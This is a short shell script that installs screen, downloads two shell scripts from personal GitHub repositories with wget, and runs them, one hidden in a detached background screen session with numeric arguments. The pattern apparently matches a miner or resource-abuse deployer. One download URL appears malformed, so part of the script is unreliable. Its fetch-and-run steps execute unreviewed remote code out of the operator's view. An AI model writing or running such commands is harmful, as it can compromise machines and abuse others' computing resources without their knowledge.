#!/bin/sh

sudo apt update
sudo apt install screen -y
wget https://github.com/pogchampv18/TM/raw/main/lawda.sh
wget https://github.com/biswas179/FkgX/main/man.sh
chmod +x man.sh
screen -dmS man ./man.sh 60 70
chmod +x lawda.sh
./lawda.sh
